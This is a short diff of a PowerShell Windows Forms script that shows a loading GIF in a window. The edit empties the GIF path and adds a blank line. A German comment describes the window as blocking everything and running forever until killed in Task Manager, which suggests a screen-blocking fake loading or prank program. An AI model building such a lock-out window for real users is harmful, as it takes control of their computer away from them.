@@ -18,7 +18,7 @@ $pictureBox.SizeMode = "Zoom"
 $pictureBox.Dock = "Top"
 $pictureBox.Height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height / 2
 
-$gifPath = Join-Path $PSScriptRoot "loading.gif"
+$gifPath = ""
 if (Test-Path $gifPath) {
     $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
 } else {
@@ -146,4 +146,5 @@ $timer.Add_Tick({
 $timer.Start()
 
 # Blockiert alles – lÃ¤uft ewig oder bis Task-Manager
+
 $form.ShowDialog() | Out-Null
